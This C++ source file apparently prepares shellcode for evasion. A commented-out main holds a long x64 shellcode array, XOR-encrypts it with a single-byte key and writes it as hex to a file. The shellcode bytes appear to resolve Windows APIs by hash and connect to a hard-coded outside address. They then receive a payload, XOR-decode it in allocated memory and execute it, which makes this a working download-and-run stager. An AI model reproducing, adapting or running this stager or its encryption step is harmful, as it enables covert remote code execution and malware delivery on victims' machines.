#include <iostream>
#include <fstream>
#include <iomanip>
#include"common.h"
using namespace std;


void saveToFile(const char* filename, unsigned char* data, size_t len) {
    ofstream outFile(filename);
    if (outFile.is_open()) {
        for (size_t i = 0; i < len; i++) {
            outFile << "\\x" << hex << setw(2) << setfill('0') << (int)data[i];
        }
        outFile.close();
    }
    else {
        cout << "Unable to open file" << endl;
    }
}

//int main() {
//    unsigned char mychar[] = "\xe9\x03\x00\x00\x00\xcc\xcc\xcc\x40\x55\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8d\xac\x24\x68\xfd\xff\xff\x48\x81\xec\x98\x03\x00\x00\xb9\x4c\x77\x26\x07\xe8\x2e\x04\x00\x00\x33\xff\xc7\x45\x90\x75\x73\x65\x72\x48\x8b\xd8\x40\x88\x7d\x9a\x48\x8d\x4d\x90\xc7\x45\x94\x33\x32\x2e\x64\x66\xc7\x45\x98\x6c\x6c\xff\xd3\x48\x8d\x4d\xa0\xc7\x45\xa0\x77\x73\x32\x5f\xc7\x45\xa4\x33\x32\x2e\x64\x66\xc7\x45\xa8\x6c\x6c\x40\x88\x7d\xaa\xff\xd3\x48\x8d\x4d\xb0\xc7\x45\xb0\x6d\x73\x76\x63\xc7\x45\xb4\x72\x74\x2e\x64\x66\xc7\x45\xb8\x6c\x6c\x40\x88\x7d\xba\xff\xd3\xb9\x29\x80\x6b\x00\xe8\xc5\x03\x00\x00\xb9\xea\x0f\xdf\xe0\x48\x89\x45\xd0\xe8\xb7\x03\x00\x00\xb9\x99\xa5\x74\x61\x4c\x8b\xe8\xe8\xaa\x03\x00\x00\xb9\xc2\xeb\x38\x5f\x48\x8b\xf0\xe8\x9d\x03\x00\x00\xb9\x58\xa4\x53\xe5\x48\x8b\xf8\xe8\x90\x03\x00\x00\xb9\x02\xd9\xc8\x5f\x48\x89\x45\xe0\xe8\x82\x03\x00\x00\xb9\x75\x6e\x4d\x61\x4c\x8b\xf8\xe8\x75\x03\x00\x00\xb9\xa9\x28\x34\x80\x48\x89\x45\xe8\xe8\x67\x03\x00\x00\xb9\x12\x1e\x7b\x4d\x48\x89\x45\xd8\xe8\x59\x03\x00\x00\xb9\x8d\x60\xeb\xd0\x4c\x8b\xe0\xe8\x4c\x03\x00\x00\xb9\x31\xfa\xf2\x70\x4c\x8b\xf0\xe8\x3f\x03\x00\x00\xb9\x30\xf3\x49\xe4\x48\x8b\xd8\xe8\x32\x03\x00\x00\x48\x8d\x55\x70\xb9\x80\x00\x00\x00\xff\xd0\x33\xc0\xc7\x44\x24\x78\x25\x73\x25\x73\x88\x44\x24\x7e\x4c\x8d\x4d\x88\x48\x8d\x85\xe8\x02\x00\x00\x66\xc7\x44\x24\x7c\x25\x73\x4c\x8d\x45\x70\x48\x89\x44\x24\x20\x48\x8d\x54\x24\x78\xc7\x45\x88\x6c\x6f\x67\x5f\x48\x8d\x4d\x70\xc7\x45\x8c\x64\x65\x2e\x00\xc7\x85\xe8\x02\x00\x00\x6c\x6f\x67\x00\x41\xff\xd6\x33\xd2\x48\x8d\x4d\x70\xff\xd3\x33\xdb\x85\xc0\x0f\x84\xb4\x02\x00\x00\x48\x8d\x44\x24\x38\xc7\x45\x80\x77\x36\x34\x20\x48\x89\x44\x24\x28\x4c\x8d\x8d\xf8\x02\x00\x00\x48\x8d\x44\x24\x30\x66\xc7\x45\x84\x20\x20\x4c\x8d\x85\xf0\x02\x00\x00\x48\x89\x44\x24\x20\x48\x8d\x54\x24\x60\x88\x5d\x86\x48\x8d\x4d\x10\xc7\x85\xf0\x02\x00\x00\x33\x39\x2e\x31\x88\x9d\xf4\x02\x00\x00\xc7\x85\xf8\x02\x00\x00\x30\x35\x2e\x31\x88\x9d\xfc\x02\x00\x00\xc7\x44\x24\x30\x35\x37\x2e\x32\x88\x5c\x24\x34\xc7\x44\x24\x38\x30\x34\x00\x00\x88\x5c\x24\x3c\xc7\x44\x24\x40\x00\x00\x00\x00\x88\x5c\x24\x44\xc7\x44\x24\x48\x00\x00\x00\x00\x88\x5c\x24\x4c\xc7\x44\x24\x50\x00\x00\x00\x00\x88\x5c\x24\x54\xc7\x44\x24\x58\x00\x00\x00\x00\x88\x5c\x24\x5c\xc7\x44\x24\x60\x25\x73\x25\x73\xc7\x44\x24\x64\x25\x73\x25\x73\x88\x5c\x24\x68\xc7\x44\x24\x70\x25\x73\x25\x73\x88\x5c\x24\x74\x41\xff\xd6\x48\x8d\x44\x24\x58\x48\x89\x44\x24\x28\x4c\x8d\x4c\x24\x48\x48\x8d\x44\x24\x50\x4c\x8d\x44\x24\x40\x48\x89\x44\x24\x20\x48\x8d\x54\x24\x60\x48\x8d\x4d\xf0\x41\xff\xd6\x4c\x8d\x4d\xf0\x4c\x8d\x45\x10\x48\x8d\x54\x24\x70\x48\x8d\x4d\x30\x41\xff\xd6\xb9\x02\x02\x00\x00\x48\x8d\x95\xf0\x00\x00\x00\xff\x55\xd0\x85\xc0\x0f\x85\x99\x01\x00\x00\x44\x8d\x73\x01\x45\x33\xc9\x44\x89\x74\x24\x28\x44\x8d\x43\x06\x41\x8b\xd6\x89\x5c\x24\x20\x8d\x4b\x02\x41\xff\xd5\x48\x8b\xd8\x48\x85\xc0\x0f\x84\x70\x01\x00\x00\x48\x8d\x4d\x30\xc7\x45\xc0\x02\x00\xef\x1c\x45\x8d\x6e\x01\xff\x55\xd8\x48\x85\xc0\x75\x09\x48\x8d\x4d\x30\x41\xff\xd4\xeb\x09\x48\x8b\x40\x18\x48\x8b\x08\x8b\x01\x89\x45\xc4\x41\xbc\x10\x00\x00\x00\xeb\x0b\xb9\x10\x27\x00\x00\xff\x15\x69\x0c\x00\x00\x45\x8b\xc4\x48\x8d\x55\xc0\x48\x8b\xcb\xff\xd6\x85\xc0\x75\xe5\x45\x33\xc9\x44\x8d\x40\x06\x48\x8d\x55\x80\x48\x8b\xcb\xff\xd7\x8a\x45\xc2\x48\x8d\x95\xe0\x02\x00\x00\x88\x85\xe0\x02\x00\x00\x45\x33\xc9\x0f\xb7\x45\xc2\x45\x8b\xc5\x66\xc1\xe8\x08\x48\x8b\xcb\x88\x85\xe1\x02\x00\x00\xff\xd7\x45\x33\xc9\x48\x8d\x95\xf0\x02\x00\x00\x48\x8b\xcb\x41\x8d\x71\x04\x44\x8b\xc6\xff\xd7\x45\x33\xc9\x48\x8d\x95\xf8\x02\x00\x00\x44\x8b\xc6\x48\x8b\xcb\xff\xd7\x45\x33\xc9\x48\x8d\x54\x24\x30\x44\x8b\xc6\x48\x8b\xcb\xff\xd7\x45\x33\xc9\x48\x8d\x54\x24\x38\x44\x8b\xc6\x48\x8b\xcb\xff\xd7\x45\x33\xc9\x48\x8d\x54\x24\x40\x44\x8b\xc6\x48\x8b\xcb\xff\xd7\x45\x33\xc9\x48\x8d\x54\x24\x48\x44\x8b\xc6\x48\x8b\xcb\xff\xd7\x45\x33\xc9\x48\x8d\x54\x24\x50\x44\x8b\xc6\x48\x8b\xcb\xff\xd7\x45\x33\xc9\x48\x8d\x54\x24\x58\x44\x8b\xc6\x48\x8b\xcb\xff\xd7\xba\x80\xc3\xc9\x01\x44\x8d\x4e\x3c\x33\xc9\x41\xb8\x00\x10\x00\x00\xff\x55\xe0\x48\x8b\xf8\x48\x85\xc0\x74\x44\x33\xf6\x41\xbc\x00\x40\x06\x00\x48\x8b\xd0\xeb\x1e\x45\x33\xc0\x85\xc0\x74\x10\x41\x8d\x0c\x30\x45\x03\xc6\x80\x34\x39\x99\x44\x3b\xc0\x72\xf0\x03\xf0\x8b\xd6\x48\x03\xd7\x45\x33\xc9\x45\x8b\xc4\x48\x8b\xcb\x41\xff\xd7\x41\x3b\xc6\x7d\xd1\x48\x8b\xcb\xff\x55\xe8\xff\xd7\x48\x81\xc4\x98\x03\x00\x00\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\x5d\xc3\x48\x8b\xc4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xec\x10\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x8b\xe9\x45\x33\xf6\x48\x8b\x50\x18\x4c\x8b\x42\x10\x4d\x39\x70\x30\x0f\x84\xb7\x00\x00\x00\x4d\x8b\x48\x30\x41\x8b\xd6\x41\x0f\x10\x40\x58\x4d\x8b\x00\x49\x63\x41\x3c\xf3\x0f\x7f\x04\x24\x46\x8b\x9c\x08\x88\x00\x00\x00\x45\x85\xdb\x74\xd1\x48\x8b\x04\x24\x48\xc1\xe8\x10\x66\x44\x3b\xf0\x73\x22\x48\x8b\x4c\x24\x08\x44\x0f\xb7\xd0\x0f\xbe\x01\xc1\xca\x0d\x80\x39\x61\x7c\x03\x83\xc2\xe0\x03\xd0\x48\xff\xc1\x49\x83\xea\x01\x75\xe7\x4f\x8d\x14\x19\x45\x8b\xde\x41\x8b\x7a\x20\x49\x03\xf9\x45\x39\x72\x18\x76\x8d\x8b\x37\x41\x8b\xde\x49\x03\xf1\x48\x8d\x7f\x04\x0f\xbe\x0e\x48\xff\xc6\xc1\xcb\x0d\x03\xd9\x84\xc9\x75\xf1\x8d\x04\x13\x3b\xc5\x74\x0e\x41\xff\xc3\x45\x3b\x5a\x18\x72\xd5\xe9\x5d\xff\xff\xff\x41\x8b\x42\x24\x43\x8d\x0c\x1b\x49\x03\xc1\x0f\xb7\x14\x01\x41\x8b\x4a\x1c\x49\x03\xc9\x8b\x04\x91\x49\x03\xc1\xeb\x02\x33\xc0\x48\x8b\x5c\x24\x20\x48\x8b\x6c\x24\x28\x48\x8b\x74\x24\x30\x48\x8b\x7c\x24\x38\x48\x83\xc4\x10\x41\x5e\xc3\xcc\xcc\xcc";
//    size_t len = sizeof(mychar) - 1; 
//
//    unsigned char key = 0xAB;
//
//    xor_encrypt_decrypt(mychar, len, key);
//    saveToFile("encrypted.txt", mychar, len);
//    printf("write done to encrypted.txt");
//
//    return 0;
//}